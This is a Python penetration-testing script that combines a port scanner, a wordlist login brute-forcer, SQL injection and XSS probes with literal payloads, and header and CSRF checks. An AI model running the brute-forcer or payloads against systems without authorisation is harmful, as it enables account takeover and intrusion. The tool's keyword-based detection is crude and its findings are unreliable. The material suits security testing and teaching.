import argparse
import socket
import requests
from bs4 import BeautifulSoup

# Function to log results
def log_results(message):
    with open("pentest_report.log", "a") as log_file:
        log_file.write(message + "\n")

# 1️⃣ Port Scanner
def port_scanner(target, ports):
    print(f"\n[+] Scanning ports on {target}...")
    log_results(f"\n[+] Scanning ports on {target}...")
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"[OPEN] Port {port} is open")
                log_results(f"[OPEN] Port {port} is open")
            s.close()
        except Exception as e:
            print(f"[ERROR] {e}")
            log_results(f"[ERROR] {e}")

# 2️⃣ Brute-Force Attack (Login Page)
def brute_force_login(url, username, password_list):
    print(f"\n[+] Brute-forcing {url} with user {username}...")
    log_results(f"\n[+] Brute-forcing {url} with user {username}...")

    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "incorrect" not in response.text.lower():  # Adjust based on website response
            print(f"[SUCCESS] Password found: {password}")
            log_results(f"[SUCCESS] Password found: {password}")
            return password
        else:
            print(f"[FAILED] Tried: {password}")
            log_results(f"[FAILED] Tried: {password}")
    
    print("[-] Brute force attack failed.")
    log_results("[-] Brute force attack failed.")
    return None

# 3️⃣ SQL Injection Tester
def test_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url)
    
    if "error" in response.text.lower() or "sql syntax" in response.text.lower():
        result = f"[!] SQL Injection vulnerability detected at {url}"
    else:
        result = f"[-] No SQL Injection vulnerability found at {url}"
    print(result)
    log_results(result)

# 4️⃣ XSS Vulnerability Tester
def test_xss(url):
    payload = "<script>alert('XSS')</script>"
    test_url = f"{url}?search={payload}"
    response = requests.get(test_url)
    
    if payload in response.text:
        result = f"[!] XSS vulnerability detected at {url}"
    else:
        result = f"[-] No XSS vulnerability found at {url}"
    print(result)
    log_results(result)

# 5️⃣ Security Headers Checker
def check_security_headers(url):
    response = requests.get(url)
    headers = response.headers

    print("\n[+] Checking Security Headers:")
    log_results("\n[+] Checking Security Headers:")
    security_headers = ["X-Frame-Options", "X-XSS-Protection", "Content-Security-Policy"]

    for header in security_headers:
        if header in headers:
            result = f"[OK] {header}: {headers[header]}"
        else:
            result = f"[WARNING] {header} is missing!"
        print(result)
        log_results(result)

# 6️⃣ CSRF Vulnerability Tester
def test_csrf(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    print("\n[+] Checking for CSRF vulnerabilities...")
    log_results("\n[+] Checking for CSRF vulnerabilities...")
    for form in forms:
        if not form.find("input", {"type": "hidden", "name": "csrf_token"}):
            result = f"[!] Possible CSRF vulnerability detected in form on {url}"
        else:
            result = f"[-] CSRF protection found in form on {url}"
        print(result)
        log_results(result)

# 🎯 Argument Parser
def main():
    parser = argparse.ArgumentParser(description="Penetration Testing Toolkit")
    parser.add_argument("-t", "--target", help="Target IP address for port scanning")
    parser.add_argument("-p", "--ports", nargs='+', type=int, help="Ports to scan (space-separated)")
    parser.add_argument("-u", "--url", help="Target URL for vulnerability scanning")
    parser.add_argument("-b", "--brute", help="Login page URL for brute-force testing")
    parser.add_argument("-U", "--username", help="Username for brute-force attack")
    parser.add_argument("-P", "--passwords", help="File containing passwords for brute-force")

    args = parser.parse_args()
    
    if args.target and args.ports:
        port_scanner(args.target, args.ports)
    
    if args.url:
        test_sql_injection(args.url)
        test_xss(args.url)
        check_security_headers(args.url)
        test_csrf(args.url)
    
    if args.brute and args.username and args.passwords:
        with open(args.passwords, "r") as file:
            passwords = [line.strip() for line in file.readlines()]
        brute_force_login(args.brute, args.username, passwords)
    
    print("\n[+] Penetration test completed. Results saved in pentest_report.log")
    log_results("\n[+] Penetration test completed. Results saved in pentest_report.log")

if __name__ == "__main__":
    main()
